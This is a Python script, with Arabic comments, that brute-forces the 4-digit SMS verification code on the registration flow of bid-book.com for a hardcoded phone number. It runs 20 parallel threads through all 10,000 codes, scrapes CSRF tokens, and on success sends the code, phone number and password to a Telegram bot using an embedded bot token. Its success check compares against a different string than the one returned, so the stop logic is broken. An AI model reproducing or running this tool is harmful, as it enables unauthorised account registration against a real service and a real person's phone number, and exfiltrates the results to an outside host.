import concurrent.futures
import re
import threading
from urllib.parse import unquote
from bs4 import BeautifulSoup
import requests

BOT_TOKEN = "7959425333:AAGucqWkb8VV2p1byvkeg68NVP_JPKqLaKM"
CHAT_ID = "6196298047"

# قفل لمنع تداخل نصوص الطباعة في الـ Terminal أثناء التوازي
print_lock = threading.Lock()

# حدث للإشارة عند العثور على الكود الصحيح وإيقاف باقي المهام
success_event = threading.Event()


# ---------------------------------------------------------
# 1. Session & Single OTP Request
# ---------------------------------------------------------
def process_otp(otp_code, phone):
    session = requests.Session()

    headers = {
        'authority': 'bid-book.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'origin': 'https://bid-book.com',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }

    # Fetch Registration Page & Extract CSRF Token
    register_url = 'https://bid-book.com/eg/Account/Register'
    try:
        res_get = session.get(register_url, headers=headers, timeout=10)
    except Exception as e:
        return f'Connection Error: {e}'

    soup = BeautifulSoup(res_get.text, 'html.parser')
    token_input = soup.find('input', {'name': '__RequestVerificationToken'})

    if not token_input:
        return 'CSRF Protection Token not found.'

    csrf_token = token_input['value']

    # Construct Registration Data
    reg_data = {
        '__RequestVerificationToken': csrf_token,
        'Name': 'Omar Ehab',
        'Phone': phone,
        'Password': 'Omar@2009',
        'ConfirmPassword': 'Omar@2009',
        'IsTermsAccept': ['true', 'false'],
    }

    headers['referer'] = register_url
    try:
        res_post = session.post(register_url, headers=headers, data=reg_data, timeout=10)
    except Exception as e:
        return f'Connection Error on Register: {e}'

    # Extract Data Parameter
    param_data = ''
    if 'data=' in res_post.url:
        param_data = res_post.url.split('data=')[1].split('&')[0]
    else:
        match = re.search(r'data=([A-Za-z0-9%+\/=]+)', res_post.text)
        if match:
            param_data = match.group(1)

    if not param_data:
        return 'ERROR: Failed to extract data parameter.'

    raw_data_value = unquote(param_data)

    # Confirm Page & Send OTP
    confirm_url = f'https://bid-book.com/eg/Account/Confirm?data={param_data}'
    try:
        res_confirm_page = session.get(confirm_url, headers=headers, timeout=10)
    except Exception as e:
        return f'Connection Error on Confirm Page: {e}'

    soup_confirm = BeautifulSoup(res_confirm_page.text, 'html.parser')
    confirm_token_input = soup_confirm.find('input', {'name': '__RequestVerificationToken'})
    confirm_csrf = confirm_token_input['value'] if confirm_token_input else csrf_token

    confirm_payload = {
        '__RequestVerificationToken': confirm_csrf,
        'Data': raw_data_value,
        'Code': otp_code,
    }

    headers['referer'] = confirm_url
    try:
        final_response = session.post(confirm_url, headers=headers, data=confirm_payload, timeout=10)
    except Exception as e:
        return f'Connection Error on OTP Submit: {e}'

    # Response Analysis
    soup_res = BeautifulSoup(final_response.text, 'html.parser')
    error_msg_tag = soup_res.find('a', {'id': 'error-message'})

    if error_msg_tag and error_msg_tag.text.strip():
        return f'Refused: {error_msg_tag.text.strip()}'
    elif (
        'Login' in final_response.url
        or 'Account/Login' in final_response.text
        or final_response.status_code == 302
    ):
        return 'Done'
    else:
        errors = soup_res.find_all(
            class_=re.compile(r'validation-summary-errors|red-color|text-danger')
        )
        if errors:
            err_text = ' '.join([e.text.strip() for e in errors if e.text.strip()])
            return f'Server Message: {err_text}'
        else:
            return 'Process completed, but check account status.'


# ---------------------------------------------------------
# 2. Telegram Notifier
# ---------------------------------------------------------
def send_telegram_message(bot_token, chat_id, text):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"Error sending Telegram message: {e}")


# ---------------------------------------------------------
# 3. Worker: Run OTP + Print + Handle Success
# ---------------------------------------------------------
def send_and_print(otp_code, phone):
    # لو لقينا الكود بالفعل، تخطى باقي المهام
    if success_event.is_set():
        return otp_code, "skipped"

    result = process_otp(otp_code, phone)

    # استخدام القفل لمنع تداخل المخرجات في شاشة الأوامر
    with print_lock:
        print("-" * 40)
        print(f"Phone Number : {phone}")
        print(f"OTP Code     : {otp_code}")
        print(f"Response     : {result}")
        print("-" * 40)

    # عند النجاح: أرسل لتليجرام + فعّل الإيقاف
    if result == "Done ✔️":
        success_event.set()

        msg = (
            f"🎉 SUCCESS! Valid OTP Code found: {otp_code}\n"
            f"📱 Phone: {phone}\n"
            f"🔑 Password: Omar@2009"
        )
        with print_lock:
            print(f"\n{msg}\n")

        send_telegram_message(BOT_TOKEN, CHAT_ID, msg)

    return otp_code, result


# ---------------------------------------------------------
# 4. Parallel Execution (0000 -> 9999)
# ---------------------------------------------------------
if __name__ == '__main__':
    target_phone = "01188899016"

    # تعديل max_workers حسب قدرة الاتصال لديك
    max_threads = 20

    # توليد الأكواد من 0000 إلى 9999
    otp_list = [f"{i:04d}" for i in range(10000)]

    print(f"🚀 Starting Multi-threaded Brute Force for {target_phone}...")

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [
            executor.submit(send_and_print, otp_code, target_phone)
            for otp_code in otp_list
        ]

        # متابعة النتائج لحظة بلحظة، وإيقاف الاستقبال عند النجاح
        for future in concurrent.futures.as_completed(futures):
            try:
                code, res = future.result()
            except Exception as e:
                print(f"❌ Future Exception: {e}")
                continue

            if res == "Done ✔️":
                # إيقاف المهام المتبقية التي لم تبدأ بعد
                executor.shutdown(wait=False, cancel_futures=True)
                break
